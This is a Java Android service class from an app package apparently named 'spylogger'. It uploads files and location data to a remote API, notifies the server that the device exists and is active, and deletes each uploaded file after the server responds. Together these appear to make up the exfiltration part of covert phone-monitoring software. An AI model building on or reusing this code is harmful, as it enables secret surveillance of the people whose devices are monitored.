package com.gravatasufoca.spylogger.services;

import android.content.Context;

import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
import com.gravatasufoca.spylogger.vos.LocalizacaoVO;

import java.io.File;

import okhttp3.MediaType;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Response;

/**
 * Created by bruno on 02/12/16.
 */

public class SendArquivoService extends SendDataService<Boolean> {

    private Context context;
    private File arquivo;


    public SendArquivoService(Context context, TaskComplete handler) {
        super(context,handler);
        this.context=context;
    }

    public void enviar(File arquivo, EnvioArquivoVO envioArquivoVO){
        this.arquivo = arquivo;

        RequestBody requestFile=RequestBody.create(MediaType.parse(Utils.getMimeType(arquivo.getAbsolutePath())),arquivo);
        Call<Boolean> call=sendApi.enviarArquivo(requestFile,envioArquivoVO);
        call.enqueue(this);
    }

    public void enviarLocalizacao(LocalizacaoVO envioArquivoVO){
        Call<Boolean> call=sendApi.enviarLocalizacao(envioArquivoVO);
        call.enqueue(this);
    }

    public void notificarExistencia(EnvioArquivoVO envioArquivoVO){
        Call<Boolean> call=sendApi.notificarExistencia(envioArquivoVO);
        call.enqueue(this);
    }

    public void enviarAtivo(EnvioArquivoVO envioArquivoVO){
        Call<Boolean> call=sendApi.enviarAtivo(envioArquivoVO);
        call.enqueue(this);
    }

    @Override
    public void onResponse(Call<Boolean> call, Response<Boolean> response) {
        super.onResponse(call, response);
        if(arquivo!=null){
            arquivo.delete();
        }
    }
}
